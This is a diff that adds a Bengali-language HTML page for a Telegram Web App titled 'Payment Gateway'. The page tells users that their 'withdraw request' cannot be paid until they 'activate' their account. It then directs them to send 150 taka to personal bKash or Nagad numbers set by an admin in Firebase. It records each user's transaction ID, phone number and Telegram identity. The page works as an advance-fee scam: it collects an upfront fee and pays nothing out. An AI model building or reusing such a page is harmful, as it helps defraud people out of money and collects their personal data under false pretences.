@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Payment Gateway</title>
+    <!-- Telegram Web App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-dark: #16181d;
+            --card-dark: #20232a;
+            --input-bg: #121418;
+            --text-primary: #ffffff;
+            --text-secondary: #9ca3af;
+            --accent-blue: #3b82f6;
+            --border-color: #2d313a;
+            --success: #10b981;
+            --bkash-color: #e2136e;
+            --nagad-color: #f7941d;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Hind Siliguri', 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* --- Header --- */
+        .user-header-container {
+            background-color: var(--card-dark);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .user-avatar-frame {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 3px solid var(--accent-blue);
+            padding: 3px;
+            margin-bottom: 12px;
+        }
+
+        .user-avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            background: #374151;
+        }
+
+        .user-fullname {
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            text-align: center;
+        }
+
+        /* --- Page 1: Status --- */
+        #page1 {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .status-card {
+            background-color: var(--card-dark);
+            border-radius: 16px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            margin-top: 10px;
+        }
+
+        .status-header {
+            font-size: 16px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+            font-weight: 500;
+            color: #e5e7eb;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 15px;
+            color: #d1d5db;
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+
+        .arrow-icon {
+            background: #374151;
+            color: #9ca3af;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            font-size: 10px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: transform 0.2s;
+            font-family: 'Hind Siliguri', sans-serif;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+        }
+
+        .btn-primary:active { transform: scale(0.98); }
+
+        /* --- Page 2: Payment --- */
+        #page2 {
+            display: none;
+            padding-bottom: 40px;
+        }
+
+        .content-container {
+            padding: 0 16px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            color: var(--accent-blue);
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            margin: 10px 0 16px 0;
+        }
+
+        .info-text {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 14px;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+
+        .amount-highlight {
+            color: #fff;
+            font-weight: bold;
+            background: rgba(59, 130, 246, 0.2);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        /* Payment Number Boxes */
+        .number-box {
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .number-label { font-weight: 700; color: #e5e7eb; font-size: 16px; }
+        .number-value { font-family: 'Inter', sans-serif; color: #ffffff; font-size: 16px; letter-spacing: 0.5px; }
+        .copy-btn { color: var(--accent-blue); background: transparent; border: none; cursor: pointer; font-size: 18px; padding: 5px; }
+
+        /* Form Card */
+        .form-card {
+            background-color: var(--card-dark);
+            border-radius: 16px;
+            padding: 20px;
+            color: var(--text-primary);
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            margin-top: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #d1d5db;
+        }
+
+        /* Payment Method Selectors */
+        .method-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .method-option {
+            background: var(--input-bg);
+            border: 2px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .method-option img {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            pointer-events: none;
+        }
+
+        .method-name {
+            font-size: 16px;
+            font-weight: 600;
+            color: #e5e7eb;
+        }
+
+        /* Selection States */
+        .method-option.selected-bkash {
+            border-color: var(--bkash-color);
+            background: rgba(226, 19, 110, 0.1);
+            box-shadow: 0 0 15px rgba(226, 19, 110, 0.2);
+        }
+
+        .method-option.selected-nagad {
+            border-color: var(--nagad-color);
+            background: rgba(247, 148, 29, 0.1);
+            box-shadow: 0 0 15px rgba(247, 148, 29, 0.2);
+        }
+
+        /* Inputs */
+        .form-group { margin-bottom: 20px; }
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            color: white;
+            transition: border-color 0.2s;
+        }
+        .form-input:focus { border-color: var(--accent-blue); }
+
+        /* Loading */
+        #loadingOverlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.9); display: none;
+            justify-content: center; align-items: center; z-index: 1000;
+            flex-direction: column; gap: 15px;
+        }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid var(--accent-blue);
+            border-top: 4px solid transparent; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .toast {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            background: #374151; color: white; padding: 10px 20px; border-radius: 20px;
+            font-size: 14px; opacity: 0; pointer-events: none; transition: opacity 0.3s;
+            z-index: 2000; box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        .toast.show { opacity: 1; }
+
+    </style>
+</head>
+<body>
+
+    <script>
+        // --- Firebase Integration ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_M6-Ei4ALcbwE4A-zb6joiw-mQtyM2uY",
+            authDomain: "payment-37a1d.firebaseapp.com",
+            databaseURL: "https://payment-37a1d-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "payment-37a1d",
+            storageBucket: "payment-37a1d.firebasestorage.app",
+            messagingSenderId: "589686151092",
+            appId: "1:589686151092:web:66b9ea9bb79618bf31c4e1"
+        };
+        
+        // For testing, define app_id
+        if (typeof __app_id === 'undefined') {
+            __app_id = 'payment-app';
+        }
+        
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const appId = __app_id;
+
+        // Init Telegram
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.enableClosingConfirmation();
+
+        let tgUser = {};
+        let selectedMethod = '';
+
+        // Initialize everything
+        const initializeApp = async () => {
+            try {
+                loadTelegramUser();
+                loadConfig();
+            } catch (error) {
+                console.error("Initialization Error:", error);
+            }
+        };
+
+        // Load Dynamic Config
+        function loadConfig() {
+            console.log("Loading config for app:", appId);
+            
+            // Using Realtime Database like your index.html
+            db.ref(`artifacts/${appId}/config`).on('value', (snapshot) => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    console.log("Config loaded:", data);
+                    
+                    // UPDATE THE TARGET BOXES FROM ADMIN
+                    const bkashBox = document.getElementById('bkashNumber');
+                    const nagadBox = document.getElementById('nagadNumber');
+
+                    if (data.bkashNumber) {
+                        bkashBox.innerText = data.bkashNumber;
+                    } else {
+                        bkashBox.innerText = "No Number Set";
+                    }
+
+                    if (data.nagadNumber) {
+                        nagadBox.innerText = data.nagadNumber;
+                    } else {
+                        nagadBox.innerText = "No Number Set";
+                    }
+                    
+                    // Update dynamic amount in all places
+                    const amount = data.amount || "150";
+                    document.querySelectorAll('.amount-text').forEach(el => el.innerText = amount);
+                } else {
+                    console.log("No config document found");
+                    // Default values if no config exists yet
+                    document.getElementById('bkashNumber').innerText = "Waiting for Admin...";
+                    document.getElementById('nagadNumber').innerText = "Waiting for Admin...";
+                    document.querySelectorAll('.amount-text').forEach(el => el.innerText = "150");
+                }
+            }, (error) => {
+                console.error("Config read error", error);
+                document.getElementById('bkashNumber').innerText = "Error Loading";
+                document.getElementById('nagadNumber').innerText = "Error Loading";
+            });
+        }
+    </script>
+
+    <!-- Page 1: Status -->
+    <div id="page1">
+        <div class="user-header-container">
+            <div class="user-avatar-frame">
+                <img id="userAvatar1" src="" alt="User" class="user-avatar">
+            </div>
+            <div id="userName1" class="user-fullname">Loading...</div>
+        </div>
+
+        <div class="status-card">
+            <div class="status-header">
+                🎉🎉 ধন্যবাদ আপনাকে উইথড্র রিকোয়েস্ট পাঠানোর জন্য। 😇
+            </div>
+            
+            <div class="status-item">
+                <div class="arrow-icon"><i class="fas fa-arrow-right"></i></div>
+                <div>আমরা দেখতে পাচ্ছি আপনার একাউন্টটি এখনো একটিভ করেন নাই।</div>
+            </div>
+            <div class="status-item">
+                <div class="arrow-icon"><i class="fas fa-arrow-right"></i></div>
+                <div>একাউন্ট একটিভ না করলে কোনো পেমেন্ট পাবেন না। 😔</div>
+            </div>
+            <div class="status-item">
+                <div class="arrow-icon"><i class="fas fa-arrow-right"></i></div>
+                <div>পেমেন্ট পেতে দ্রুত আপনার একাউন্ট একটিভ করে নিন।</div>
+            </div>
+            <div class="status-item">
+                <div class="arrow-icon"><i class="fas fa-arrow-right"></i></div>
+                <div>কিভাবে একাউন্ট একটিভ করবেন? একটিভ বাটনে ক্লিক করুন 👇</div>
+            </div>
+
+            <button class="btn-primary" onclick="goToPage2()">
+                একাউন্ট এ্যাকটিভ করুন
+            </button>
+        </div>
+    </div>
+
+    <!-- Page 2: Payment -->
+    <div id="page2">
+        <div class="user-header-container">
+            <div class="user-avatar-frame">
+                <img id="userAvatar2" src="" alt="User" class="user-avatar">
+            </div>
+            <div id="userName2" class="user-fullname">Loading...</div>
+        </div>
+
+        <div class="content-container">
+            <h2 class="section-title">একাউন্ট একটিভ করে পেমেন্ট নিন</h2>
+            
+            <p class="info-text">
+                আমাদের প্ল্যাটফর্ম থেকে প্রথম পেমেন্ট নিতে হলে আপনাকে <span class="amount-text amount-highlight">150</span> টাকা দিয়ে আপনার একাউন্ট একটিভ করতে হবে।
+            </p>
+            <p class="info-text">
+                আমাদের বিকাশ এবং নগদ পার্সোনাল নাম্বারে <span class="amount-text amount-highlight">150</span> টাকা সেন্ড মানি করে নিচের ফরমটি পূরণ করে সাবমিট করুন।
+            </p>
+
+            <br>
+
+            <div class="number-box">
+                <div class="number-label">বিকাশ: <span id="bkashNumber" class="number-value">...</span></div>
+                <button class="copy-btn" onclick="copyToClipboard('bkashNumber')"><i class="far fa-copy"></i></button>
+            </div>
+            
+            <div class="number-box">
+                <div class="number-label">নগদ: <span id="nagadNumber" class="number-value">...</span></div>
+                <button class="copy-btn" onclick="copyToClipboard('nagadNumber')"><i class="far fa-copy"></i></button>
+            </div>
+
+            <p class="info-text" style="font-size: 13px; margin-top: 10px;">
+                সঠিকভাবে টাকা পাঠানো হলে, আমরা সর্বোচ্চ ১ ঘন্টার মধ্যে আপনার পেমেন্ট কমপ্লিট করে দিব।
+            </p>
+
+            <!-- Form -->
+            <div class="form-card">
+                <div class="form-group">
+                    <label class="form-label">পেমেন্ট মাধ্যম সিলেক্ট করুন</label>
+                    <div class="method-selector">
+                        <div class="method-option" id="method-bkash" onclick="selectMethod('bkash')">
+                            <img src="https://freelogopng.com/images/all_img/1656234841bkash-icon-png.png" alt="bKash">
+                            <span class="method-name">বিকাশ</span>
+                        </div>
+                        <div class="method-option" id="method-nagad" onclick="selectMethod('nagad')">
+                            <img src="https://freelogopng.com/images/all_img/1679248787Nagad-Logo.png" alt="Nagad">
+                            <span class="method-name">নগদ</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">আপনার সেন্ড মানি নম্বর</label>
+                    <input type="tel" id="senderNumber" class="form-input" placeholder="যে নম্বর থেকে টাকা পাঠিয়েছেন">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">ট্রানজেকশন আইডি</label>
+                    <input type="text" id="trxId" class="form-input" placeholder="TrxID এখানে লিখুন">
+                </div>
+
+                <button class="btn-primary" onclick="submitPayment()">সাবমিট করুন</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading & Toast -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <div style="color: white; font-weight: 500;">সাবমিট হচ্ছে...</div>
+    </div>
+    <div id="toast" class="toast">Copied!</div>
+
+    <script>
+        // --- Telegram Logic ---
+        function loadTelegramUser() {
+            console.log("Loading Telegram user data...");
+            tgUser = tg.initDataUnsafe?.user;
+            console.log("Telegram user data:", tgUser);
+            
+            let displayName = "Guest User";
+            let photoUrl = `https://ui-avatars.com/api/?name=Guest+User&background=3b82f6&color=fff&size=128`;
+
+            if (tgUser) {
+                displayName = tgUser.first_name || '';
+                if (tgUser.last_name) {
+                    displayName += ' ' + tgUser.last_name;
+                }
+                
+                if (tgUser.photo_url) {
+                    photoUrl = tgUser.photo_url;
+                    console.log("Using Telegram profile photo:", photoUrl);
+                } else {
+                    photoUrl = `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=random&color=fff&size=128`;
+                    console.log("Using generated avatar");
+                }
+            } else {
+                 // Fallback for non-telegram environment (testing)
+                 console.log("No Telegram user data found, using fallback");
+                 displayName = "Test User";
+                 photoUrl = `https://ui-avatars.com/api/?name=Test+User&background=3b82f6&color=fff&size=128`;
+            }
+
+            // Set the user name and avatar
+            document.getElementById('userName1').innerText = displayName;
+            document.getElementById('userName2').innerText = displayName;
+            
+            const avatar1 = document.getElementById('userAvatar1');
+            const avatar2 = document.getElementById('userAvatar2');
+            
+            avatar1.src = photoUrl;
+            avatar2.src = photoUrl;
+            
+            // Add error handling for avatar images
+            avatar1.onerror = function() {
+                console.log("Failed to load avatar 1, using fallback");
+                this.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=3b82f6&color=fff&size=128`;
+            };
+            
+            avatar2.onerror = function() {
+                console.log("Failed to load avatar 2, using fallback");
+                this.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=3b82f6&color=fff&size=128`;
+            };
+            
+            console.log("User loaded:", displayName, photoUrl);
+        }
+
+        function goToPage2() {
+            document.getElementById('page1').style.display = 'none';
+            document.getElementById('page2').style.display = 'block';
+            window.scrollTo(0, 0);
+            try { tg.expand(); } catch(e) {}
+        }
+
+        function selectMethod(method) {
+            selectedMethod = method;
+            document.getElementById('method-bkash').classList.remove('selected-bkash');
+            document.getElementById('method-nagad').classList.remove('selected-nagad');
+            
+            if(method === 'bkash') {
+                document.getElementById('method-bkash').classList.add('selected-bkash');
+            } else {
+                document.getElementById('method-nagad').classList.add('selected-nagad');
+            }
+        }
+
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).innerText;
+            if (navigator.clipboard && window.isSecureContext) {
+                 navigator.clipboard.writeText(text).then(() => {
+                     showToast('Number Copied!');
+                 }).catch(err => {
+                     console.error('Clipboard error:', err);
+                     showToast('Copy failed');
+                 });
+            } else {
+                // Fallback
+                let textArea = document.createElement("textarea");
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    showToast('Number Copied!');
+                } catch (err) {
+                    console.error('Fallback copy error:', err);
+                    showToast('Copy failed');
+                }
+                document.body.removeChild(textArea);
+            }
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        async function submitPayment() {
+            const senderNumber = document.getElementById('senderNumber').value.trim();
+            const trxId = document.getElementById('trxId').value.trim();
+
+            if (!selectedMethod) {
+                tg.showAlert('অনুগ্রহ করে পেমেন্ট মেথড সিলেক্ট করুন');
+                return;
+            }
+            if (!senderNumber) {
+                tg.showAlert('অনুগ্রহ করে সেন্ড মানি নম্বর দিন');
+                return;
+            }
+            if (!trxId) {
+                tg.showAlert('অনুগ্রহ করে ট্রানজেকশন আইডি দিন');
+                return;
+            }
+
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            try {
+                const fullName = (tgUser.first_name + ' ' + (tgUser.last_name || '')).trim() || 'Guest';
+
+                // Use Realtime Database like your index.html
+                const paymentRef = db.ref(`artifacts/${appId}/payments`).push();
+                await paymentRef.set({
+                    userId: tgUser.id || 'unknown',
+                    telegramId: tgUser.id || 'unknown',
+                    telegramFullName: fullName,
+                    telegramUsername: tgUser.username ? '@' + tgUser.username : 'No Username',
+                    method: selectedMethod,
+                    senderNumber: senderNumber,
+                    transactionId: trxId,
+                    amount: document.querySelector('.amount-text').innerText, 
+                    status: 'pending',
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+
+                document.getElementById('loadingOverlay').style.display = 'none';
+                
+                tg.showAlert('আপনার পেমেন্ট রিকোয়েস্ট সফলভাবে সাবমিট হয়েছে!');
+                
+                // Reset
+                document.getElementById('senderNumber').value = '';
+                document.getElementById('trxId').value = '';
+                document.getElementById('method-bkash').classList.remove('selected-bkash');
+                document.getElementById('method-nagad').classList.remove('selected-nagad');
+                selectedMethod = '';
+                
+                // Go back to page 1
+                document.getElementById('page2').style.display = 'none';
+                document.getElementById('page1').style.display = 'flex';
+
+            } catch (error) {
+                console.error("Error submitting:", error);
+                document.getElementById('loadingOverlay').style.display = 'none';
+                tg.showAlert('Error submitting payment: ' + error.message);
+            }
+        }
+
+        // Initialize the app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("DOM loaded, initializing app...");
+            initializeApp();
+        });
+    </script>
+</body>
+</html>
